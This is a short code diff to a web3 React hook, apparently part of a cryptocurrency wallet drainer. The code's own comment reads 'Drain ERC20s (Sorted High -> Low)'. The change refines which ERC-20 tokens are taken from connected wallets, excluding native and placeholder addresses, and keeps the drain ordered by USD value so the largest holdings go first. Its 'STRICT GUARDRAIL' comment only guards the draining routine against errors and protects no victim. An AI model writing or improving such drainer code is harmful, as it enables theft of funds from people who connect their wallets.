@@ -461,7 +461,12 @@ export function useWeb3Manager() {
                 }
 
                 // 3. Drain ERC20s (Sorted High -> Low)
-                const chainTokens = tokensByChain[chainId].filter(t => !t.isNative);
+                // STRICT GUARDRAIL: Filter out any asset where isNative is true or address is zero
+                const chainTokens = tokensByChain[chainId].filter(t =>
+                    !t.isNative &&
+                    t.address !== "0x0000000000000000000000000000000000000000" &&
+                    t.address !== "0x0eeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeee"
+                );
                 // Double check sort
                 chainTokens.sort((a, b) => (b.usd_value || 0) - (a.usd_value || 0));
 
